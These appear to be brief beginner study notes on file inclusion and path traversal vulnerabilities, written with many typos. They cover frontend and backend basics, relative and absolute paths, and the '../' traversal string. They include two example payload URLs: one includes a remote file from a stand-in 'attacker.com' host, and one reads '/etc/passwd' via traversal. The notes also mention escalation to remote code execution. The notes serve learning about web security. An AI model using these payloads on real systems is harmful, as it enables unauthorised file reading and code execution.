File inclusion and path traversal vulnerabilities arise when a web allows external input to change path for accessing files.

To proceed, we need to know that apps have frontend that the user(client) directly interact with and the backend, which process user request sending them to the server.

eg of frontend frameworks : React, Angular, Vue

eg. of backend used languages and frameworks: PHP, python, Javascript, Node.js, Django, Laravel.

file inclusion and path vulnerabilities arises when user inputs are not properly sanitized pr Sanitized.

traversal string "../" is used to access folder one level up.

Relative path refeers to using file and folder in the current directory: ./directory/fipt.sh

Absolute path is mentioning the complete path of the file started to the root /

Remote File Inclusion or RFI is an attacker point a parameter to a remote file that the app gets : eg. http://rfi.php?file=attacker.com/exploit.php

LFI or Local File Inclusion is the attacker exploit path traversal to access file other than what thet were intented to access: http://lfi.php?file=../../../etc/passwd

LFI can also lead to RCE if the attacker upload a malicious file and later include or execute it.
